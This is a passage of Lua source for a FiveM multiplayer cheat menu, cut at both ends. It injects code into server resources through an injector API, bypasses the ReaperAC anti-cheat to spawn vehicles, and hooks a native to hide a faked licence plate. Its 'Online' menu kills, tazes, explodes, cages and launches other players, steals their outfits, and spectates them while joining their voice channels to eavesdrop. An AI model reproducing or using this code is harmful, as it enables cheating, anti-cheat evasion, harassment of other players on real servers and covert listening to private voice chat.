                                        if IsPedInAnyVehicle(ped, false) then
                                            local veh = GetVehiclePedIsUsing(ped)
                                            if DoesEntityExist(veh) then
                                                SetVehicleFuelLevel(veh, 100.0)
                                            end
                                        end
                                        Wait(1000)
                                    end
                                end)
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Auto Enter, Unlock & Hotwire',
                        onConfirm = function(checked)
                            AutoEnterVehicle = checked
                            if checked then
                                CreateThread(function()
                                    while AutoEnterVehicle do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsEntering(ped)
                                        if veh and veh ~= 0 then
                                            SetPedIntoVehicle(ped, veh, -1)
                                            if GetPedInVehicleSeat(veh, -1) == ped then
                                                if GetVehicleDoorLockStatus(veh) ~= 1 then
                                                    SetVehicleDoorsLocked(veh, 1)
                                                end
                                                if IsVehicleNeedsToBeHotwired(veh) then
                                                    SetVehicleNeedsToBeHotwired(veh, false)
                                                end
                                            end
                                        end
                                        Wait(1)
                                    end
                                end)
                            end
                        end
                    }
                }
            },
            {
                name = 'Spawner & Plate',
                submenu = {
                    {
                        type = 'button',
                        label = 'Set License Plate',
                        onConfirm = function()
                            showInput('Enter License Plate', '', function(plateText)
                                if plateText and plateText ~= '' then
                                    local ped = PlayerPedId()
                                    local veh = GetVehiclePedIsUsing(ped)
                                    if veh and veh ~= 0 then
                                        local originalPlate = GetVehicleNumberPlateText(veh)
                                        local hookedVeh = veh
                                        MachoHookNative(0x7CE1CCB9B293020E, function(vehicle)
                                            if vehicle == hookedVeh then
                                                return false, originalPlate
                                            end
                                            return true, GetVehicleNumberPlateText(vehicle)
                                        end)
                                        SetVehicleNumberPlateText(veh, plateText)
                                        showNotify('Plate set to: ' .. plateText, 'success')
                                    end
                                end
                            end, 'typeable')
                        end
                    },
                    {
                        type = 'button',
                        label = 'Spawn Car -Custom-',
                        onConfirm = function()
                            showInput('Enter Model Name', 'Adder', function(carModel)
                                spawnCustomVehicle(carModel)
                            end, 'typeable')
                        end
                    },
                    {
                        type = 'button',
                        label = 'Spawn Car -Native-',
                        onConfirm = function()
                            showInput('Enter Model Name', 'Adder', function(VehicleModel)
                                if VehicleModel and VehicleModel ~= "" then
                                    local spawnLocalFlag = spoofedVehicleSpawning and "false" or "true"
                                    local spawnNetFlag = spoofedVehicleSpawning and "false" or "true"
                                    MachoInjectResource2(NewThreadNs, 'any', string.format([[
            local getUnhookedFunction = ReaperAC.API.GetUnhookedFunction
            local CreateVehicleUnsafe = getUnhookedFunction("CreateVehicle")
            local setModel = GetHashKey('%s')
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())
            local entity = CreateVehicleUnsafe(setModel, coords.x, coords.y, coords.z, heading, true, true, true)
                                    ]], VehicleModel, spawnLocalFlag, spawnNetFlag))
                                end
                            end, 'typeable')
                        end
                    },
                }
            },
            {
                name = 'Actions',
                submenu = {
                    {
                        type = 'button',
                        label = 'Repair Vehicle',
                        onConfirm = function()
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsUsing(ped)
                            if veh and veh ~= 0 then
                                SetVehicleFixed(veh)
                                SetVehicleDirtLevel(veh, 0)
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Refuel Vehicle',
                        onConfirm = function()
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsUsing(ped)
                            if veh and veh ~= 0 then
                                SetVehicleFuelLevel(veh, 100.0)
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Flip Vehicle',
                        onConfirm = function()
                            local veh = GetVehiclePedIsUsing(PlayerPedId())
                            if veh and veh ~= 0 then
                                local heading = GetEntityHeading(veh)
                                SetEntityRotation(veh, 0.0, 0.0, heading)
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Clean Vehicle',
                        onConfirm = function()
                            local veh = GetVehiclePedIsUsing(PlayerPedId())
                            if veh and veh ~= 0 then
                                SetVehicleDirtLevel(veh, 0.0)
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Delete Vehicle',
                        onConfirm = function()
                            executeCode('any', string.format([[
                                local veh = GetVehiclePedIsUsing(PlayerPedId())
                                if veh and veh ~= 0 then
                                    DeleteVehicle(veh)
                                end
                            ]]))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Toggle Vehicle Engine',
                        onConfirm = function()
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsUsing(ped)
                            if veh and veh ~= 0 then
                                if GetIsVehicleEngineRunning(veh) then
                                    SetVehicleEngineOn(veh, false, true, true)
                                else
                                    SetVehicleEngineOn(veh, true, true, false)
                                end
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Max Vehicle Upgrades',
                        onConfirm = function()
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsUsing(ped)
                            if veh and veh ~= 0 then
                                SetVehicleModKit(veh, 0)
                                SetVehicleWheelType(veh, 7)
                                for i = 0, 16 do
                                    local max = GetNumVehicleMods(veh, i)
                                    if max and max > 0 then SetVehicleMod(veh, i, max - 1, false) end
                                end
                                for i = 17, 22 do ToggleVehicleMod(veh, i, true) end
                                SetVehicleMod(veh, 23, 1, false)
                                SetVehicleMod(veh, 24, 1, false)
                                for _, mod in ipairs({ 25, 27, 28, 30, 33, 34, 35 }) do
                                    local max = GetNumVehicleMods(veh, mod)
                                    if max and max > 0 then SetVehicleMod(veh, mod, max - 1, false) end
                                end
                                local max38 = GetNumVehicleMods(veh, 38)
                                if max38 and max38 > 0 then SetVehicleMod(veh, 38, max38 - 1, true) end
                                SetVehicleWindowTint(veh, 1)
                                SetVehicleTyresCanBurst(veh, false)
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Lock Closest Vehicle',
                        onConfirm = function()
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)
                            local veh = GetClosestVehicle(pos.x, pos.y, pos.z, 5.0, 0, 70)
                            if veh and DoesEntityExist(veh) then
                                for i = 1, 2 do
                                    SetVehicleDoorsLockedForAllPlayers(veh, true)
                                    Wait(1)
                                end
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Unlock Closest Vehicle',
                        onConfirm = function()
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)
                            local veh = GetClosestVehicle(pos.x, pos.y, pos.z, 5.0, 0, 70)
                            if veh and DoesEntityExist(veh) then
                                for i = 1, 2 do
                                    SetVehicleDoorsLockedForAllPlayers(veh, false)
                                    Wait(1)
                                end
                            end
                        end
                    }
                }
            }
        }
    },
    {
        label = 'Online',
        icon = 'ph-globe',
        type = 'submenu',
        tabs = {
            {
                name = 'List',
                submenu = {
                    {
                        type = 'button',
                        label = 'Check All Players',
                        icon = 'ph-check-square',
                        onConfirm = function()
                            Risk:SelectEveryone()
                        end
                    },
                    {
                        type = 'button',
                        label = 'Un Check All Players',
                        icon = 'ph-square',
                        onConfirm = function()
                            Risk:UnselectEveryone()
                        end
                    },
                    {
                        type = 'button',
                        label = 'Clear Selection',
                        icon = 'ph-trash',
                        onConfirm = function()
                            Risk:ClearSelection()
                        end
                    },
                    {
                        type = 'button',
                        label = 'Ignore Self',
                        icon = 'ph-user-minus',
                        onConfirm = function()
                            Risk:IgnoreSelf()
                        end
                    },
                    { type = 'divider', label = 'Nearby Players' }
                }
            },
            {
                name = 'Player Options',
                submenu = {
                    {
                        type = 'button',
                        label = 'Teleport to Player',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                    local targetID = %d
                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                    local mePed = PlayerPedId()

                                    if DoesEntityExist(targetPed) then
                                        local coords = GetEntityCoords(targetPed)
                                        SetPedCoordsKeepVehicle(mePed, coords.x, coords.y, coords.z + 1.0)
                                    end
                                ]], targetSid))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Spectate Player',
                        onConfirm = function(checked)
                            local targetSid
                            for serverId, chk in pairs(CPlayers or {}) do
                                if chk then
                                    targetSid = serverId
                                    break
                                end
                            end

                            if checked then
                                if not targetSid then
                                    showNotify('You must select a player first!', 'error')
                                    return
                                end

                                if GetResourceState('ReaperV4') == 'started' then
                                    executeCode('any', string.format([[
                                        local targetID = %d
                                        local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                        if not DoesEntityExist(targetPed) then return end
                                        NetworkSetInSpectatorMode(true, targetPed)
                                    ]], targetSid))
                                else
                                    executeCode('any', string.format([[
                                        _G.__SpectateRunning = true
                                        local tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                        local cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                        _G.__SpectateCam = cam

                                        SetCamActive(cam, true)
                                        RenderScriptCams(true, false, 0, true, false)

                                        local function enableSpectateVoice()
                                            local players = GetActivePlayers()
                                            for i = 1, #players do
                                                local ply = players[i]
                                                local sid = GetPlayerServerId(ply)
                                                if sid ~= GetPlayerServerId(PlayerId()) then
                                                    local ch = MumbleGetVoiceChannelFromServerId(sid)
                                                    if ch ~= -1 then
                                                        MumbleAddVoiceChannelListen(ch)
                                                    end
                                                end
                                            end
                                        end

                                        enableSpectateVoice()

                                        CreateThread(function()
                                            local distanceBehind = 3.0
                                            local baseHeight = 1.0

                                            while _G.__SpectateRunning and tgtPed and DoesEntityExist(tgtPed) do
                                                Wait(1)
                                                local coords = GetEntityCoords(tgtPed)
                                                RequestAdditionalCollisionAtCoord(coords.x, coords.y, coords.z)
                                                SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                                local camRot = GetGameplayCamRot(0)
                                                local pitch = -math.rad(camRot.x)
                                                local heading = math.rad(camRot.z)

                                                local offsetX = -math.sin(heading) * math.cos(pitch) * distanceBehind
                                                local offsetY =  math.cos(heading) * math.cos(pitch) * distanceBehind
                                                local offsetZ =  math.sin(pitch) * distanceBehind

                                                local camX = coords.x + offsetX
                                                local camY = coords.y + offsetY
                                                local camZ = coords.z + baseHeight + offsetZ

                                                SetCamCoord(cam, camX, camY, camZ)
                                                PointCamAtEntity(cam, tgtPed, 0.0, 0.0, 0.8, true)

                                                tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                            end

                                            ClearFocus()
                                            RenderScriptCams(false, false, 0, true, false)
                                            DestroyCam(cam, false)
                                            _G.__SpectateCam = nil
                                        end)
                                    ]], targetSid, targetSid))
                                end
                            else
                                executeCode('any', [[
                                    _G.__SpectateRunning = false
                                    if _G.__SpectateCam then
                                        ClearFocus()
                                        RenderScriptCams(false, false, 0, true, false)
                                        DestroyCam(_G.__SpectateCam, false)
                                        _G.__SpectateCam = nil
                                    end

                                    local players = GetActivePlayers()
                                    for i = 1, #players do
                                        local ply = players[i]
                                        local sid = GetPlayerServerId(ply)
                                        if sid ~= GetPlayerServerId(PlayerId()) then
                                            local ch = MumbleGetVoiceChannelFromServerId(sid)
                                            if ch ~= -1 then
                                                MumbleRemoveVoiceChannelListen(ch)
                                            end
                                        end
                                    end

                                    if NetworkSetInSpectatorMode then
                                        NetworkSetInSpectatorMode(false, 0)
                                    end
                                ]])
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Steal Outfit',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end

                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local localPed  = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))

                                if not (DoesEntityExist(targetPed) and DoesEntityExist(localPed)) then return end

                                local targetModel = GetEntityModel(targetPed)
                                RequestModel(targetModel)
                                while not HasModelLoaded(targetModel) do Wait(0) end
                                SetPlayerModel(PlayerId(), targetModel)
                                SetModelAsNoLongerNeeded(targetModel)
                                Wait(100)

                                localPed = PlayerPedId()

                                for i = 0, 11 do
                                    SetPedComponentVariation(
                                        localPed, i,
                                        GetPedDrawableVariation(targetPed, i),
                                        GetPedTextureVariation(targetPed, i),
                                        GetPedPaletteVariation(targetPed, i)
                                    )
                                end

                                for i = 0, 9 do
                                    local propIndex = GetPedPropIndex(targetPed, i)
                                    if propIndex ~= -1 then
                                        SetPedPropIndex(localPed, i, propIndex, GetPedPropTextureIndex(targetPed, i), true)
                                    else
                                        ClearPedProp(localPed, i)
                                    end
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Cage Player',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local modelHash = GetHashKey('prop_gold_cont_01')
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) then
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(0) end
                                    local coords = GetEntityCoords(targetPed)
                                    local cage = CreateObject(modelHash, coords.x, coords.y, coords.z - 1.0, true, true, false)
                                    FreezeEntityPosition(cage, true)
                                    SetModelAsNoLongerNeeded(modelHash)
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Explode Player',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) then
                                    local coords = GetEntityCoords(targetPed)
                                    local explosionHash = GetHashKey('EXPLOSION_MOLOTOV')
                                    AddExplosionWithUserVfx(coords.x, coords.y, coords.z, 2, explosionHash, 1.0, true, false, 1.0)
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Explode Vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) then
                                    local coords = GetEntityCoords(targetPed)
                                    local explosionHash = GetHashKey('EXPLOSION_MOLOTOV')
                                    AddExplosionWithUserVfx(coords.x, coords.y, coords.z, 5, explosionHash, 1.0, true, false, 1.0)
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'scroll',
                        label = 'Attach Prop',
                        selected = 1,
                        options = {
                            { label = 'roadcone02a', value = 'prop_roadcone02a' }, { label = 'barrier_work05', value = 'prop_barrier_work05' }, { label = 'bin_05a', value = 'prop_bin_05a' }, { label = 'gnome2', value = 'prop_gnome2' },
                            { label = 'flamingo',    value = 'prop_flamingo' }, { label = 'alien_egg_01', value = 'prop_alien_egg_01' }, { label = 'cactus_01', value = 'prop_cactus_01' }, { label = 'gascyl_01a', value = 'prop_gascyl_01a' },
                            { label = 'weed_01',    value = 'prop_weed_01' }, { label = 'toilet_01', value = 'prop_toilet_01' }, { label = 'dummy_01', value = 'prop_dummy_01' }, { label = 'skid_tent_01', value = 'prop_skid_tent_01' },
                            { label = 'beach_fire', value = 'prop_beach_fire' }, { label = 'ecola_can', value = 'prop_ecola_can' }, { label = 'pizza_box_02', value = 'prop_pizza_box_02' }
                        },
                        onConfirm = function(data)
                            local targetPlayers = {}
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then targetPlayers[#targetPlayers + 1] = serverId end
                            end

                            if #targetPlayers == 0 then
                                showNotify('You must select at least one player!', 'error')
                                return
                            end

                            local objectModel = data.value
                            for _, targetSid in ipairs(targetPlayers) do
                                executeCode('any', string.format([[
                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                    local modelHash = GetHashKey('%s')
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(0) end
                                    local coords = GetEntityCoords(targetPed)
                                    local obj = CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, false)
                                    AttachEntityToEntity(obj, targetPed, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                                ]], targetSid, objectModel))
                            end
                        end
                    },
                    {
                        label = 'Place Particle On Player',
                        type = 'button',
                        onConfirm = function()
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    if GetResourceState('any') == 'started' then
                                        executeCode('any', string.format([[[
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                            if DoesEntityExist(targetPed) then
                                                Entity(targetPed).state:set("ptfx", false, true)
                                                Wait(100)
                                                Entity(targetPed).state:set("ptfxAsset", "scr_rcbarry2", true)
                                                Entity(targetPed).state:set("ptfxName", "scr_clown_appears", true)
                                                Entity(targetPed).state:set("ptfxBone", 0, true)
                                                Entity(targetPed).state:set("ptfxScale", 2.0, true)
                                                Entity(targetPed).state:set("ptfxOffset", vector3(0.0, 0.0, 0.0), true)
                                                Entity(targetPed).state:set("ptfxRot", vector3(0.0, 0.0, 0.0), true)
                                                Wait(100)
                                                Entity(targetPed).state:set("ptfx", true, true)
                                            end
                                        ]], serverId))
                                    elseif GetResourceState('any') == 'started' then
                                        executeCode('any', string.format([[
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                            if DoesEntityExist(targetPed) then
                                                local effect = {
                                                    asset = "scr_rcbarry2",
                                                    name  = "scr_exp_clown"
                                                }

                                                Entity(targetPed).state:set("ptfx", false, true)
                                                Wait(100)
                                                Entity(targetPed).state:set("ptfxAsset", effect.asset, true)
                                                Entity(targetPed).state:set("ptfxName", effect.name, true)
                                                Entity(targetPed).state:set("ptfxOffset", vector3(0.0, 0.0, 0.0), true)
                                                Entity(targetPed).state:set("ptfxRot", vector3(0.0, 0.0, 0.0), true)
                                                Entity(targetPed).state:set("ptfxBone", 11816, true)
                                                Entity(targetPed).state:set("ptfxScale", 1.0, true)
                                                Entity(targetPed).state:set("ptfx", true, true)
                                            end
                                        ]], serverId))
                                    end
                                end
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Attach To Player',
                        onConfirm = function()
                            showInput("Do u want to go Invisibility?", "YES OR NO", function(choice)
                                local invis = (choice and string.upper(choice) == "YES")
                                for serverId, checked in pairs(CPlayers or {}) do
                                    if checked then
                                        executeCode('any', string.format([[
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                            local myPed = PlayerPedId()
                                            AttachEntityToEntity(myPed, targetPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                                            if %s then
                                                SetEntityVisible(myPed, false, false)
                                            end
                                        ]], serverId, tostring(invis)))
                                    end
                                end
                            end, "typeable")
                        end
                    },
                    {
                        type = 'button',
                        label = 'Void Player',
                        onConfirm = function()
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    CreateThread(function()
                                        local targetPed = GetPlayerPed(GetPlayerFromServerId(serverId))
                                        if not DoesEntityExist(targetPed) then return end
                                        local myPed = PlayerPedId()
                                        local originalCoords = GetEntityCoords(myPed)
                                        local originalHeading = GetEntityHeading(myPed)
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local vehicle = GetClosestVehicle(targetCoords.x, targetCoords.y, targetCoords.z,
                                            500.0, 0, 70)
                                        if not DoesEntityExist(vehicle) then vehicle = GetVehiclePedIsIn(targetPed, false) end
                                        if not DoesEntityExist(vehicle) then return end
                                        NetworkRequestControlOfEntity(vehicle)
                                        Wait(100)
                                        SetPedIntoVehicle(myPed, vehicle, -1)
                                        Wait(200)
                                        ClearPedTasks(myPed)
                                        local startTime = GetGameTimer()
                                        while GetGameTimer() - startTime < 3000 do
                                            if DoesEntityExist(vehicle) and DoesEntityExist(targetPed) then
                                                AttachEntityToEntityPhysically(vehicle, targetPed, 0, 0, 0, 2000.0,
                                                    1460.928, 1000.0, 10.0, 88.0, 600.0, true, true, true, false, 0)
                                            end
                                            Wait(0)
                                        end
                                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z,
                                            false, false, false, true)
                                        SetEntityHeading(myPed, originalHeading)
                                        SetEntityVisible(myPed, true, 0)
                                        ResetEntityAlpha(myPed)
                                    end)
                                end
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Attach Vehicle',
                        onConfirm = function()
                            showInput("Vehicle Name", "", function(vehName)
                                if vehName and vehName ~= "" then
                                    CreateThread(function()
                                        for serverId, checked in pairs(CPlayers or {}) do
                                            if checked then
                                                spawnCustomVehicle(vehName)
                                                Wait(1500)
                                                executeCode('any', string.format([[
                                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                                    local ped = PlayerPedId()
                                                    local veh = GetVehiclePedIsIn(ped, false)
                                                    if veh and veh ~= 0 then
                                                        AttachEntityToEntity(veh, targetPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                                                    end
                                                ]], serverId))
                                            end
                                        end
                                    end)
                                end
                            end, "typeable")
                        end
                    },
                    {
                        type = 'button',
                        label = 'Launch Player',
                        onConfirm = function()
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    executeCode('any', string.format([[
                                        local targetSid = %d
                                        local function GetPlayerFromServerId(serverId)
                                            for _, player in ipairs(GetActivePlayers()) do
                                                if GetPlayerServerId(player) == serverId then
                                                    return player
                                                end
                                            end
                                            return nil
                                        end

                                        CreateThread(function()
                                            local clientId = GetPlayerFromServerId(targetSid)
                                            if not clientId then return end

                                            local selected_ped = GetPlayerPed(clientId)
                                            if not selected_ped or not IsEntityAPed(selected_ped) or selected_ped == PlayerPedId() then
                                                return
                                            end

                                            local d = GetEntityCoords(PlayerPedId())
                                            local selected_coords = GetEntityCoords(selected_ped)
                                            local nearestVehicle = GetClosestVehicle(selected_coords.x, selected_coords.y, selected_coords.z, 100.0, 0, 71)

                                            if not DoesEntityExist(nearestVehicle) then return end

                                            SetPedIntoVehicle(PlayerPedId(), nearestVehicle, -1)

                                            local timer = GetGameTimer() + 1300
                                            while (not NetworkHasControlOfEntity(nearestVehicle)) and GetGameTimer() < timer do
                                                NetworkRequestControlOfEntity(nearestVehicle)
                                                Wait(1)
                                            end

                                            AttachEntityToEntityPhysically(
                                                nearestVehicle,
                                                selected_ped,
                                                -1e38,
                                                1e26,
                                                0,
                                                1e38,
                                                -1e38,
                                                800990.0,
                                                19980.0,
                                                1e26,
                                                99999.0,
                                                true,
                                                true,
                                                false,
                                                false,
                                                0
                                            )
                                            ClearPedTasks(PlayerPedId())
                                            SetEntityVisible(PlayerPedId(), true, true)
                                            SetEntityCoordsNoOffset(PlayerPedId(), d.x, d.y, d.z, true, true, false)
                                            Wait(1)
                                        end)
                                    ]], serverId))
                                end
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Kill Player',
                        icon = 'ph-crosshair',
                        desc = 'Kills selected player',
                        onConfirm = function()
                            local targetSid

                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end

                            if not targetSid then
                                showNotify('You must select a player first!', 'error')

                                return
                            end

                            executeCode('any', string.format([[
                                CreateThread(function()
                                    local weaponName = 'vehicle_weapon_subcar_mg'
                                    local ammoAmount = 999
                                    local targetSid = %d
                                    local weapon = GetHashKey(weaponName)

                                    RequestWeaponAsset(weapon, 31, 26)
                                    while not HasWeaponAssetLoaded(weapon) do
                                        Wait(0)
                                    end

                                    local selfPed = PlayerPedId()
                                    GiveDelayedWeaponToPed(selfPed, weapon, ammoAmount, true)
                                    SetPedAmmo(selfPed, weapon, ammoAmount)

                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                    if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                        ShootSingleBulletBetweenCoords(fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, selfPed, true, false, 999999.0)

                                        SetPedUsingActionMode(selfPed, true, -1, 1)
                                        SetPedCurrentWeaponVisible(selfPed, false, false, true, true)
                                    end

                                    SetPedUsingActionMode(selfPed, false, -1, 'DEFAULT_ACTION')
                                    RemoveWeaponFromPed(selfPed, weapon)
                                    SetCurrentPedWeapon(selfPed, 'weapon_unarmed', true)
                                end)
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Kill Player Method #2',
                        icon = 'ph-crosshair',
                        desc = 'Kills selected player Method #2',
                        onConfirm = function()
                            local targetSid

                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end

                            if not targetSid then
                                showNotify('You must select a player first!', 'error')

                                return
                            end

                            executeCode('any', string.format([[
                                local weaponName = 'weapon_appistol'
                                local ammoAmount = 999
                                local targetSid = %d

                                CreateThread(function()
                                    local weapon = GetHashKey(weaponName)

                                    RequestWeaponAsset(weapon, 31, 26)
                                    while not HasWeaponAssetLoaded(weapon) do
                                        Wait(0)
                                    end

                                    local selfPed = PlayerPedId()
                                    GiveDelayedWeaponToPed(selfPed, weapon, ammoAmount, true)
                                    SetPedAmmo(selfPed, weapon, ammoAmount)

                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                    if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                        ShootSingleBulletBetweenCoords(fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, selfPed, true, false, 999999.0)

                                        SetPedUsingActionMode(selfPed, true, -1, 1)
                                        SetPedCurrentWeaponVisible(selfPed, false, false, true, true)
                                    end

                                    SetPedUsingActionMode(selfPed, false, -1, 'DEFAULT_ACTION')
                                    RemoveWeaponFromPed(selfPed, weapon)
                                    SetCurrentPedWeapon(selfPed, 'weapon_unarmed', true)
                                end)
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Taze Player',
                        icon = 'ph-crosshair',
                        desc = 'Tazes selected player',
                        onConfirm = function()
                            local targetSid

                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end

                            if not targetSid then
                                showNotify('You must select a player first!', 'error')

                                return
                            end

                            executeCode('any', string.format([[
                                local weaponName = 'weapon_stungun'
                                local ammoAmount = 999
                                local targetSid = %d

                                CreateThread(function()
                                    local weapon = GetHashKey(weaponName)

                                    RequestWeaponAsset(weapon, 31, 26)
                                    while not HasWeaponAssetLoaded(weapon) do
                                        Wait(0)
                                    end

                                    local selfPed = PlayerPedId()
                                    GiveDelayedWeaponToPed(selfPed, weapon, ammoAmount, true)
                                    SetPedAmmo(selfPed, weapon, ammoAmount)

                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                    if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                        ShootSingleBulletBetweenCoords(fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, selfPed, true, false, 999999.0)

                                        SetPedUsingActionMode(selfPed, true, -1, 1)
                                        SetPedCurrentWeaponVisible(selfPed, false, false, true, true)
                                    end

                                    SetPedUsingActionMode(selfPed, false, -1, 'DEFAULT_ACTION')
                                    RemoveWeaponFromPed(selfPed, weapon)
                                    SetCurrentPedWeapon(selfPed, 'weapon_unarmed', true)
                                end)
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Ban Player',
                        icon = 'ph-hammer',
                        desc = 'Bans the selected player',
                        onConfirm = function()
                            CreateThread(function()
                                for serverId, checked in pairs(CPlayers or {}) do
                                    if checked then
                                        spawnCustomVehicle('faction')
                                        Wait(1500)
                                        executeCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                local myPed = PlayerPedId()
                                local myVeh = GetVehiclePedIsIn(myPed, false)
                                if DoesEntityExist(targetPed) and DoesEntityExist(myVeh) then
                                    SetPedIntoVehicle(targetPed, myVeh, -2)
                                end
                            ]], serverId))
                                    end
                                end
                            end)
                        end
                    },
                    {
                        type = 'button',
                        label = 'Mess up Players Car',
                        icon = 'ph-car',
                        desc = 'Mess up selected player car / RISKY',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) then
                                    local fok = ClonePed(targetPed, 1, 1, 1)
                                    SetEntityVisible(fok, false, true)
                                    AttachEntityToEntityPhysically(fok, targetPed, 0, 0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 180.0, 180.0, 999999.0, true, true, true, false, 2)
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
